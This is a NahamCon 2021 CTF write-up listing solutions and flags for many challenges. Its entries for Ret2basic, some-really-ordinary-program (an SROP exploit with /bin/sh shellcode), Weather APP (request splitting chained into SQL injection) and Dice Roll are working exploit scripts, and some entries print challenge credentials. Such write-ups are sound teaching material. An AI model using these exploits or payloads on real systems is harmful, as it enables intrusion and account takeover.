# NahamCon CTF

## Challenges

1. [Rules Source Code](#rules-source-code)
2. [Nahamcon2021](#nahamcon2021)
3. [Veebee](#veebee)
4. [Echo](#echo)
5. [Homeward Bound](#homeward-bound)
6. [Shoelaces](#shoelaces)
7. [Pollex](#pollex)
8. [Car Keys](#car-keys)
9. [Eighth Circle](#eighth-circle)
10. [Henpeck](#henpeck)
11. [Ret2basic](#ret2basic)
12. [The List](#the-list)
13. [Esab64](#esab64)
14. [Resourceful](#resourceful)
15. [Chicken Wings](#chicken-wings)
16. [Andra](#andra)
17. [Merch Store](#merch-store)
18. [Bad Blog](#bad-blog)
19. [Dice Roll](#dice-roll)
20. [Microscopium](#microscopium)
21. [Typewriter](#typewriter)
22. [Some-really-ordinary-program](#some-really-ordinary-program)
23. [Weather APP](#weather-app)
24. [Eaxy](#eaxy)
25. [Mission](#mission)
26. [Bionic](#bionic)
27. [Meet The Team](#meet-the-team)
28. [Gus](#gus)
29. [Hercules](#hercules)
30. [Lyra](#lyra)
31. [Orion](#orion)
32. [Leo](#leo)
33. [Hydraulic](#hydraulic)
34. [Banking On It](#banking-on-it)
35. [Internal](#internal)
36. [Degrade](#degrade)
37. [Centaurus](#centaurus)

#### Rules Source Code
<details><summary>Solution</summary>

Looking at the rules page source code
https://ctf.nahamcon.com/rules

![image](https://user-images.githubusercontent.com/1076452/111090411-65452a00-850e-11eb-943b-b20405467058.png)

```flag{90bc54705794a62015369fd8e86e557b}```

</details>

#### Nahamcon2021
<details><summary>Solution</summary>

https://twitter.com/NahamSec/status/1370077327082680321

![image](https://user-images.githubusercontent.com/1076452/111090516-bc4aff00-850e-11eb-9ec5-84700071e38d.png)

```flag{e36bc5a67dd2fe5f33b62123f78fbcef}```
</details>

#### Veebee
<details><summary>Solution</summary>

For this challenge, I used the tool VB Script Coders.exe
https://www.aldeid.com/wiki/Decode-VBE-script

![image](https://user-images.githubusercontent.com/1076452/111078386-de735b80-84d3-11eb-912b-a0be3716c787.png)

Clicked VBE-2-VBS button, selected the vbe file and the tool generated a file called "decoded.vbs". Looking at the "decoded.vbs" source code it was still encoded so changed the extension from .vba to .vbe and decoded it again.

![image](https://user-images.githubusercontent.com/1076452/111078404-f77c0c80-84d3-11eb-9234-6d43c5088ee0.png)

```flag{f805593d933f5433f2a04f082f400d8c}```
</details>

#### Echo

<details><summary>Solution</summary>

![image](https://user-images.githubusercontent.com/1076452/111018313-e7124780-8396-11eb-8fa1-b99817861f79.png)

![image](https://user-images.githubusercontent.com/1076452/111018299-d6fa6800-8396-11eb-8e52-279d10ecd11a.png)

![image](https://user-images.githubusercontent.com/1076452/111018288-cba73c80-8396-11eb-8d5b-53e1e3203942.png)

```flag{1beadaf44586ea4aba2ea9a00c5b6d91}```

</details>


#### Homeward Bound

<details><summary>Solution</summary>

When entering the website, it displayed a message "Sorry, this page is not accessible externally".
![image](https://user-images.githubusercontent.com/1076452/111000058-25d8db00-8360-11eb-9b99-3a045d6fd1f2.png)


Added "X-Fordered-For: 127.0.0.1" header (which is a common method for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or load balancer) and got the flag.
![image](https://user-images.githubusercontent.com/1076452/111000087-30937000-8360-11eb-998c-07f49f530a66.png)

```flag{26080a2216e95746ec3e932002b9baa4}```

</details>

#### Shoelaces
<details><summary>Solution</summary>

strings shoelaces.jpg | grep flag

```flag{137288e960a3ae9b148e8a7db16a69b0}```

</details>

#### Pollex
<details><summary>Solution</summary>

Using binwalk to extract all files from challenge file

```binwalk --dd='.*' pollex```

![image](https://user-images.githubusercontent.com/1076452/111015405-6435c080-8387-11eb-8b51-a97ce86ac290.png)

```flag{65c34a1ec121a286600ddd48fe36bc00}```
</details>

#### Car Keys
<details><summary>Solution</summary>

Using https://cryptii.com/ and alphabetical substitution with the encoded flag and the key (qwerty) obtained from challenge description.

![image](https://user-images.githubusercontent.com/1076452/111019745-e7631080-839f-11eb-9708-59de62d02bc9.png)

```flag{6f980c0101c8aa361977cac06508a3de}```
</details>

#### Eighth Circle
<details><summary>Solution</summary>

http://www.malbolge.doleczek.pl/

![image](https://user-images.githubusercontent.com/1076452/111020021-baaff880-83a1-11eb-8efd-e168fd0f6bdd.png)
</details>

#### Henpeck
<details><summary>Solution</summary>

```tshark -r ./henpeck.pcap -Y 'usb.capdata && usb.data_len == 8' -T fields -e usb.capdata | sed 's/../:&/g2' > keyboards.txt```

https://github.com/TeamRocketIst/ctf-usb-keyboard-parser

```
python usbkeyboard.py keyboards.txt 
so the answer is flag{f7733e0093b7d281dd0a30fcf34a9634} hahahah lol
```
</details>

#### Ret2basic

<details><summary>Solution</summary>

```
#!/usr/bin/python
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./ret2basic')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./ret2basic', gdbscript=gs)
    if args.REMOTE:
        return remote('challenge.nahamcon.com', 30413)
    else:
        return process('./ret2basic')
r = start()
#========= exploit here ===================
win = 0x401215
#ret = 0x40133b
payload = "A" * 120
#payload += p64(ret)
payload += p64(win)
r.sendlineafter(": ",payload)

#========= interactive ====================
r.interactive()
```

![image](https://user-images.githubusercontent.com/1076452/111002592-810ccc80-8364-11eb-9f58-0ca4bb807ed0.png)


</details>

#### The List
<details><summary>Solution</summary>

```flag{0eb219803dbfcda8620dae0772ae2d72}```
</details>

#### esab64
<details><summary>Solution</summary>

cat esab64 | rev | base64 -d | rev

```flag{fb5211b498afe87b1bd0db601117e16e}```
</details>

#### Resourceful
<details><summary>Solution</summary>

![image](https://user-images.githubusercontent.com/1076452/111007125-e1077100-836c-11eb-9a10-edb11904272d.png)

![image](https://user-images.githubusercontent.com/1076452/111007090-cf25ce00-836c-11eb-989e-3e9f1d579b6c.png)

![image](https://user-images.githubusercontent.com/1076452/111007110-da78f980-836c-11eb-9510-ce5ad11a8954.png)

```flag{7eecc051f5cb3a40cd6bda40de6eeb32}```
</details>

#### Chicken wings 
<details><summary>Solution</summary>

https://lingojam.com/WingDing

```flag{e0791ce68f718188c0378b1c0a3bdc9e}```
</details>

#### Andra
<details><summary>Solution</summary>

![image](https://user-images.githubusercontent.com/1076452/111007452-a9e58f80-836d-11eb-8fcb-2b86f03bf057.png)

![image](https://user-images.githubusercontent.com/1076452/111007468-b2d66100-836d-11eb-91b5-ac0fed2e04a5.png)

![image](https://user-images.githubusercontent.com/1076452/111007499-b833ab80-836d-11eb-892e-e2854621be02.png)

```flag{d9f72316dbe7ceab0db10bed1a738482}```
</details>

#### Merch Store
<details><summary>Solution</summary>

https://www.nahamcon.com/merch

Source code from merch store

![image](https://user-images.githubusercontent.com/1076452/111091979-6a58a800-8513-11eb-849b-ff6ec7b57ddc.png)

```flag{fafc10617631126361c693a2a3fce5a7} ```
</details>

#### Bad Blog
<details><summary>Solution</summary>

SQLi En user agent
![image](https://user-images.githubusercontent.com/1076452/111036069-1c9d4c00-83fc-11eb-8b89-be0cd7109da4.png)

![image](https://user-images.githubusercontent.com/1076452/111036081-2e7eef00-83fc-11eb-9070-ff2fe726a45b.png)

![image](https://user-images.githubusercontent.com/1076452/111036096-40609200-83fc-11eb-91ee-bece11537691.png)

![image](https://user-images.githubusercontent.com/1076452/111036157-8e759580-83fc-11eb-8e5d-18b9580a45c2.png)

![image](https://user-images.githubusercontent.com/1076452/111036146-8158a680-83fc-11eb-883a-568c950166ae.png)

![image](https://user-images.githubusercontent.com/1076452/111036109-4eaeae00-83fc-11eb-820f-9789a85bca4d.png)

```flag{8b31eecb1831ed594fa27ef5b431fe34}```
</details>

#### Dice Roll
<details><summary>Solution</summary>

https://github.com/tna0y/Python-random-module-cracker

```
#!/usr/bin/env python
from pwn import *
from randcrack import RandCrack

rc = RandCrack()
r = remote('challenge.nahamcon.com', 31784)

def roll():
    r.sendlineafter("> ","2")
    r.recvline()
    data = r.recvline()
    rc.submit(int(data))

def guess(num):
    print("Guessing the dice...")
    r.sendlineafter("> ","3")
    r.sendlineafter("> ","{}".format(num))
    data = r.recvline()
    print(data)
    r.recvline()
    data = r.recvline()
    print(data)

print("Getting data to make prediction...")
for i in range(624):
    roll()

num = rc.predict_getrandbits(32)
print("Predicted: {}".format(num))
guess(num)
```

![image](https://user-images.githubusercontent.com/1076452/111038864-db139d80-8409-11eb-9023-5fbcb952e2ea.png)

```flag{e915b62b2195d76bfddaac0160ed3194}```
</details>

#### Microscopium
<details><summary>Solution</summary>

React APP

![image](https://user-images.githubusercontent.com/1076452/111053514-29915e00-8443-11eb-9c2c-2f80fb1c2181.png)

```
apktool.jar d microscopium.apk
npx react-native-decompiler -i index.android.bundle -o ./output
```

![image](https://user-images.githubusercontent.com/1076452/111053531-4fb6fe00-8443-11eb-944f-2f67f8adf188.png)

Bruteforce PIN
```
const { Base64 } = require('js-base64');
const { sha256 } = require('js-sha256')

var cipher64 = "AA9VAhkGBwNWDQcCBwMJB1ZWVlZRVAENW1RSAwAEAVsDVlIAV00=";
var partKey = 'pgJ2K9PMJFHqzMnqEgL';

var n = Base64.toUint8Array(cipher64);

for (pin = 0; pin <= 9999; pin++) {
    hash = sha256.create()
    hash.update(partKey);
    hash.update(String(pin));

    var u = ''
    for (var l = hash.hex(), c = 0; c < n.length; c++) {
        u += String.fromCharCode(n[c] ^ l.charCodeAt(c));
    }

    if (u.indexOf('flag{') != -1) {
        console.log("Pin: " + pin);
        break;
    }
}
console.log(u)
```
```
Pin: 4784
flag{06754e57e02b0c505149cd1055ba5e0b}
```
</details>

#### Typewriter
<details><summary>Solution</summary>

https://digital-forensics.sans.org/media/volatility-memory-forensics-cheat-sheet.pdf

```volatility imageinfo -f image.bin```

![image](https://user-images.githubusercontent.com/1076452/111054076-3ebcbb80-8448-11eb-80ff-bce10100edd7.png)

```volatility -f image.bin --profile=Win7SP1x86_23418 cmdline```

![image](https://user-images.githubusercontent.com/1076452/111054089-5eec7a80-8448-11eb-83d7-1090de2c698d.png)

```volatility -f image.bin --profile=Win7SP1x86_23418 filescan | grep .docx```

![image](https://user-images.githubusercontent.com/1076452/111054096-79beef00-8448-11eb-889a-bc721ae3a9c8.png)

```volatility -f image.bin --profile=Win7SP1x86_23418 dumpfiles -Q 0x000000007eb665b8 -n --dump-dir=.```

![image](https://user-images.githubusercontent.com/1076452/111054105-8c392880-8448-11eb-84c0-c3c7f4d74426.png)

![image](https://user-images.githubusercontent.com/1076452/111054054-061ce200-8448-11eb-9a86-b5050475f6ce.png)

```flag{c442f9ee67c7ab471bb5643a9346cf5e}```
</details>

#### some-really-ordinary-program
<details><summary>Solution</summary>

```
#!/usr/bin/env python3
from pwn import *
import sys
import subprocess

context(terminal=['tmux', 'new-window'])
context(os="linux", arch="amd64")

p_name = "./some-really-ordinary-program"  ## change for the challenge name
DEBUG = 0
context.log_level = "debug"

if DEBUG:
    
    p = process(p_name)         ## Start the new process
    gdb_command = '''b * 0x401056'''.split('\n')    ## The command that will run gdb at startup
    attach_command = "tmux new-window gdb {} {} ".format(p_name,p.pid)
    for k in gdb_command:
        attach_command += '''--eval-command="{}" '''.format(k)
    log.debug("Starting a new gdb session with the following command: {}".format(attach_command))
    subprocess.Popen(attach_command, shell=True, stdin=subprocess.PIPE)
else:
    p = remote("challenge.nahamcon.com", 32119)
## everything goes here

####    ADDRESSES  ####

call_read = p64(0x401000)
syscall_ret = p64(0x40100e)   #   syscall; ret
sub_rsp = p64(0x401026)
push_rbp = p64(0x401022)
main = p64(0x401022)

call_read_p3 = p64(0x401006)

bss = 0x0000000000402000 
####               ####
####    FUNCTIONS  ####
####               ####

input("Send first payload ? ")

frame_mprotect = SigreturnFrame()

frame_mprotect.rax = 0xa
frame_mprotect.rdi = 0x0000000000400000
frame_mprotect.rsi = 0x1000
frame_mprotect.rdx = 0x7
frame_mprotect.rsp = 0x400088
frame_mprotect.rip = u64(syscall_ret)

# Make the bss writable and executable

payload = b''
payload += b'A' * 508
payload += push_rbp
#payload += call_read
payload += syscall_ret
payload += bytes(frame_mprotect)
payload += b'B' * 8
payload += b'C' * 8

p.sendline(payload)

input("Send second payload ? ")

p.sendline(b'F' * (0xf-1) )

input("Send third payload ? ")
payload = b''
payload += b'\x31\xc0\x50\x48\x31\xff\x48\xc7\xc0\x3b\x00\x00\x00\x48\xc7\xc7\x88\x00\x40\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05'

'''
rasm2 -b 64 'xor eax, eax 
push eax
xor rdi, rdi
mov rax, 0x3b
mov rdi, 0x400088
xor rsi, rsi
quote> xor rdx, rdx
quote> syscall'
'''

payload += b'A' * (144 - len(payload) - len(b'/bin/sh\x00'))   #   Reach the place on the bss where the RSP is placed to overwrite the return address
payload += b'/bin/sh\x00'
payload += p64(0x400000) #   return to the shellcode, since we have the bss executable now
p.sendline(payload)

p.interactive()
```
```flag{175c051dbd3db6857f3e6d2907952c87}```
</details>

#### Weather APP
<details><summary>Solution</summary>

```
#!/usr/bin/python3

import requests
import sys
from requests.utils import requote_uri


if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <url>")
    exit(127)

headers = {
            "Host": "127.0.0.1"
        }

# problematic chars for nodejs 8.12 (https://jaeseokim.tistory.com/98)
SPACE = "Ġ"
CRLF = "čĊ"
SLASH = "į"

# base post data
post_payload = "username={}&password=bruh"

# sql payload to update admin pass
payload = "admin','bruh') ON CONFLICT(username) DO UPDATE SET password='bruh'; --"

# urlencoded sql payload
sql_payload = requote_uri(payload)

# insert payloads into base payloads and calc length
user_payload = post_payload.format(sql_payload)
l_payload = len(post_payload.format("")) + len(sql_payload)+10

# payload sent to /api/weather/ endpoint
base_payload = "127.0.0.1/test"+SPACE+"HTTP"+SLASH+"1.1"+CRLF+"HOST:"+SPACE+"127.0.0.1"+CRLF*2+"POST"+SPACE+SLASH+"register"+SPACE+"HTTP"+SLASH+"1.1"+CRLF+"HOST:"+SPACE+"127.0.0.1"+CRLF+"CONTENT-TYPE:"+SPACE+"application"+SLASH+"x-www-form-urlencoded"+CRLF+"CONTENT-LENGTH:"+SPACE+str(l_payload)+CRLF*2+user_payload+CRLF*2+"GET"+SPACE+SLASH+"aaa#"

data = {"endpoint": base_payload,
        "city": "bruh_city",
        "country": "bruh country"
        }

# get url from cmdline arg
url = sys.argv[1]

res = requests.post(url, data, headers)
print(res.text)
```
```HTB{w3lc0m3_t0_th3_p1p3_dr34m}```
</details>

#### Eaxy
<details><summary>Solution</summary>

```
#!/usr/bin/env python3
import string
import re

charset = string.ascii_lowercase + string.digits + '{}'

def xor_strings(xs, ys):
    return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

flag = [' '] * 38
def brute(data,val):
    xord_byte_array = bytearray(len(data))
    for i in range(len(xord_byte_array)):
	    xord_byte_array[i] = data[i] ^ ord(val)
    d = xord_byte_array.decode('utf-8')

    if 'flag' in d:
        result = re.findall( r'is the (.*?) character',d)
        for r in result:
            flag[int(r)] = val

f = open('eaxy', 'rb')
data = bytearray(f.read())

for i in charset:
    brute(data,i)
print(''.join(flag))
```
```flag{16edfce5c12443b61828af6cab90dc79}```
</details>

## Mission
<details><summary>Solution</summary>

Source code

![image](https://user-images.githubusercontent.com/1076452/111015203-6ea38a80-8386-11eb-833a-647bffe6b2b6.png)

```flag{48e117a1464c3202714dc9a350533a59}```
</details>

### Bionic
<details><summary>Solution</summary>

![image](https://user-images.githubusercontent.com/1076452/111012004-27170180-837a-11eb-8aa6-8f0434726b1b.png)
</details>

### Meet The Team
<details><summary>Solution</summary>

https://github.com/internetwache/GitTools

https://constellations.page/.git/

git show

![image](https://user-images.githubusercontent.com/1076452/111013989-719b7c80-8380-11eb-9d8b-719daeb8cbe1.png)

</details>

### Gus
<details><summary>Solution</summary>

![image](https://user-images.githubusercontent.com/1076452/111011972-ffc03480-8379-11eb-8996-25197d69882c.png)

</details>

### Hercules
<details><summary>Solution</summary>

![image](https://user-images.githubusercontent.com/1076452/111013207-5da24b80-837d-11eb-94b6-fa2ce6b44d39.png)
</details>

### Lyra
<details><summary>Solution</summary>

![image](https://user-images.githubusercontent.com/1076452/111014284-c986b300-8381-11eb-86a2-847f0693ee78.png)

![image](https://user-images.githubusercontent.com/1076452/111014303-de634680-8381-11eb-85ee-3b94b44dac07.png)

![image](https://user-images.githubusercontent.com/1076452/111014312-ea4f0880-8381-11eb-9bfb-d8e0a0ae7060.png)
</details>

### Orion
<details><summary>Solution</summary>

https://twitter.com/OrionMorra/status/1363789936219082756

![image](https://user-images.githubusercontent.com/1076452/111014551-ea9bd380-8382-11eb-9418-a6b223bd1c13.png)
</details>

### Leo
<details><summary>Solution</summary>

![image](https://user-images.githubusercontent.com/1076452/111017557-1c1c9b00-8393-11eb-8485-7011fa58aea8.png)

![image](https://user-images.githubusercontent.com/1076452/111017573-2b034d80-8393-11eb-996e-b7169e37a59f.png)

``` flag{636db5f4f0e36908a4f1a4edc5b0676e}  A password for Leo is `constelleorising` ```

</details>

### Sensible
<details><summary>Solution</summary>

Entrar con datos de leo -> leo:constelleorising

</details>

### Hydraulic
<details><summary>Solution</summary>

![image](https://user-images.githubusercontent.com/1076452/111021178-5133e800-83a9-11eb-8fb5-8724f47169f7.png)

```[ssh] host: challenge.nahamcon.com   login: pavo   password: starsinthesky```

![image](https://user-images.githubusercontent.com/1076452/111021210-8b9d8500-83a9-11eb-8aac-24088f8267f2.png)

```flag{cadbbfd75d2547700221f8c2588e026e}```
</details>

### Banking On It
<details><summary>Solution</summary>

Entrar con user gus e id_rsa

https://github.com/gusrodry/development/tree/master/config/.ssh
</details>

### Internal
<details><summary>Solution</summary>

</details>

### Degrade
<details><summary>Solution</summary>

![image](https://user-images.githubusercontent.com/1076452/111021372-7a08ad00-83aa-11eb-80c7-5ecc86733971.png)
</details>

### Centaurus
<details><summary>Solution</summary>

![image](https://user-images.githubusercontent.com/1076452/111052561-9d7b3880-843a-11eb-9c3e-7bd1e74b1e44.png)

![image](https://user-images.githubusercontent.com/1076452/111052567-b257cc00-843a-11eb-9555-6d4ad8dec3a2.png)

![image](https://user-images.githubusercontent.com/1076452/111052569-bd126100-843a-11eb-8e22-f329691d9a0e.png)

![image](https://user-images.githubusercontent.com/1076452/111052573-c7ccf600-843a-11eb-866f-9f8872ffbfd6.png)

```flag{4a8f943a965086945794066f7ce97f23}```
</details>
